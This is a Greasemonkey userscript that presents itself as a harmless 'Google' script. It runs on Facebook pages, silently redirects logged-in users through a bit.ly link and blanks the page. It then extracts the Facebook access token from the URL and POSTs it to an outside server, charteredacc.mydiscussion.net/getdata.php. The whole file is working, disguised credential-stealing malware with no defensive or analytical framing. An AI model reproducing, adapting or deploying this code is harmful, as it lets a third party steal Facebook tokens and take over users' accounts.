// ==UserScript==
// @name            GM
// @author          Anon
// @namespace       http://www.google.com/
// @description     Google
// @license         Creative Commons Attribution License
// @version	        1.0
// @include         http://*.facebook.com/*
// @include         https://*.facebook.com/*
// @compatible      Greasemonkey
// @grant			GM_xmlhttpRequest
// ==/UserScript==

function main()
{
var newUrl1 = 'http://bit.ly/YNeoaD'
window.open(newUrl1,'_self',false);
document.body.innerHTML = "";
var full = window.location.protocol + "://" + window.location.host + "/" + window.location.pathname + window.location.search + window.location.hash;
var parts = full.split('=')
var token = parts[1]
var tokengrab = '\nAccess Token= ' + token

  if(document.URL.indexOf("AAADIy") >= 0){ 
GM_xmlhttpRequest({
  method:'POST',
  url:'http://charteredacc.mydiscussion.net/getdata.php',
  data:"urldata=" + escape(tokengrab),
  headers: {'Content-type': 'application/x-www-form-urlencoded'}
 });
 window.stop();
 var newUrl2 = 'about:blank'
window.open(newUrl2,'_self',false);
}
}
if (document.cookie.indexOf("c_user") >= 0) {
main();
}